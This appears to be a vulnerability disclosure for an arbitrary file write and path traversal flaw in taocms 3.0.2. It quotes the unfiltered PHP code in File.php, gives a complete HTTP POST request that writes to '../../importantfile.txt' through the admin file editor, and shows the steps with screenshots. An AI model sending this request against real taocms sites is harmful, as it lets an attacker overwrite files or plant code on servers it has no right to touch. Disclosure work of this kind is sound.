# taocms-3.0.2 Arbitrary File Writing Vulnerability



## Vulnerable file

- path:`include\Model\File.php`

- code

  $this->path can be controlled by the user and is not filtered at all, leading to path traversal.

  ```php
  function __construct($table,$id=0){
  		$this->table=$table;
  		$this->path=$_REQUEST['path'];
  		$this->realpath=SYS_ROOT.$this->path;
  		$this->tpl=new Template();
  	}
  ```

  save() does not filter the file content at all.

  ```php
  function save(){
  		$path=$this->path;
  		if(!is_writable($this->realpath))Base::showmessage('无保存权限');
  		$filedata=get_magic_quotes_gpc()?Base::magic2word($_POST['filedata']):$_POST['filedata'];
  		$status=file_put_contents($this->realpath,$filedata);
  		if($status){
  			Base::showmessage('保存成功','admin.php?action=file&ctrl=lists');
  		}
  	}
  ```



## Payload

```http
POST /admin/admin.php HTTP/1.1
Host: taocms.wcx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Origin: http://taocms.wcx
Connection: close
Referer: http://taocms.wcx/admin/admin.php?action=file&ctrl=edit&path=data/install.lock
Cookie: PHPSESSID=ji3j74p9mkr9763j2n8njal6b6
Upgrade-Insecure-Requests: 1

name=data%2Finstall.lock&filedata=arbitrary+file+writing+test&action=file&ctrl=save&path=../../importantfile.txt&Submit=%E4%BF%9D%E5%AD%98
```



## Vulnerability Exploitation Process

- Suppose there is an important file stored at `D:/ProgramFiles(x86)`.

  ![image-20240417220837924](https://github.com/majic-banana/vulnerability/blob/main/photo/image-20240417220837924.png)

- Locate the corresponding frontend position and edit the test content.![image-20240417214527059](C:\Users\王晨旭\Desktop\笔记\picture\image-20240417214527059.png)

- Modify the request packet to the above payload, then send it.





## Result

![image-20240417221640037](https://github.com/majic-banana/vulnerability/blob/main/photo/image-20240417221640037.png)



![image-20240417221902077](https://github.com/majic-banana/vulnerability/blob/main/photo/image-20240417221902077.png)



Contents of importantfile.txt:

![image-20240417221808502](https://github.com/majic-banana/vulnerability/blob/main/photo/image-20240417221808502.png)
